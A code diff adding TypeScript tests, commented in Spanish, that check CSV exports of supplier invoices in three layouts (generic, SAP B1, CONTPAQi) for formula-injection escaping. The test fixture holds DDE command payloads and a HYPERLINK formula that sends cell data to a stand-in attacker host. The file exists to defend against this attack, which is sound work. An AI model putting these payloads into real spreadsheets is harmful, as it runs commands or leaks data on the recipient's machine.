@@ -3,6 +3,7 @@ import {
   leerDescripcionPrimerConcepto, compararReceptor, cfdiIngresable, validarFotoParaIngreso,
   aFilaExportProveedor, aFilaSapB1, aFilaContpaqi, type FacturaProveedor,
 } from './proveedores';
+import { toCsv } from './export';
 
 // Solo el motor PURO: ingesta/decisión son el patrón claim de la base
 // (unique + eq estado, verificaciones 66 y 86); aquí se fijan los contratos
@@ -145,5 +146,55 @@ describe('aFilaContpaqi — la variante simple en español', () => {
     expect(fila.iva).toBe('');
     expect(fila.concepto).toBe('');
     expect(fila.total).toBe(2668);
+  });
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
+// AUDITORÍA ADVERSARIAL ALTO #1 — INYECCIÓN DE FÓRMULAS CSV (CWE-1236), de
+// punta a punta: la `descripcion` sale de `leerDescripcionPrimerConcepto`
+// (atributo libre de un CFDI que llega por correo NO autenticado) y el RFC del
+// emisor/receptor sale igual de libre del XML. Ninguno valida un patrón al
+// extraerse (proveedores.ts:75-83) — la protección tiene que sobrevivir hasta
+// el CSV que de verdad abre Excel, en los TRES layouts.
+// ═══════════════════════════════════════════════════════════════════════════
+describe('Export de facturas de proveedor — inyección de fórmulas CSV, de punta a punta', () => {
+  // El emisor del CFDI (un proveedor hostil, o un correo suplantado contra el buzón) manda un
+  // Concepto/@Descripcion y un Emisor/@Rfc que, al abrirse en Excel, se leerían como fórmula.
+  const FACTURA_HOSTIL: FacturaProveedor = {
+    ...FACTURA,
+    emisorRfc: '=cmd|\'/c calc\'!A1',
+    receptorRfc: '+2+5+cmd|\' /C calc\'!A0',
+    descripcion: '=HYPERLINK("http://evil.example/robar?x="&A1,"ver factura")',
+  };
+
+  it('layout genérico: descripcion, rfc_emisor y rfc_receptor salen ESCAPADOS en el CSV', () => {
+    const csv = toCsv([aFilaExportProveedor(FACTURA_HOSTIL)]);
+    const fila = csv.trimEnd().split('\n')[1];
+    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
+    expect(fila).not.toMatch(/(^|,)=cmd\|/);
+    expect(fila).not.toMatch(/(^|,)\+2\+5/);
+    expect(fila).toContain("'=HYPERLINK");
+    expect(fila).toContain("'=cmd|");
+    expect(fila).toContain("'+2+5");
+  });
+
+  it('layout SAP B1 (CardName/FederalTaxID/Comments/ItemDescription): igual de protegido', () => {
+    const csv = toCsv([aFilaSapB1(FACTURA_HOSTIL)]);
+    const fila = csv.trimEnd().split('\n')[1];
+    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
+    expect(fila).not.toMatch(/(^|,)=cmd\|/);
+  });
+
+  it('layout CONTPAQi (rfc_proveedor/concepto): igual de protegido', () => {
+    const csv = toCsv([aFilaContpaqi(FACTURA_HOSTIL)]);
+    const fila = csv.trimEnd().split('\n')[1];
+    expect(fila).not.toMatch(/(^|,)=HYPERLINK/);
+    expect(fila).not.toMatch(/(^|,)=cmd\|/);
+  });
+
+  it('el total (number, jamás libre) nunca se escapa aunque la factura sea hostil', () => {
+    const csv = toCsv([aFilaExportProveedor({ ...FACTURA_HOSTIL, total: -500 })]);
+    const fila = csv.trimEnd().split('\n')[1];
+    expect(fila).toMatch(/(^|,)-500(,|$)/);
   });
 });
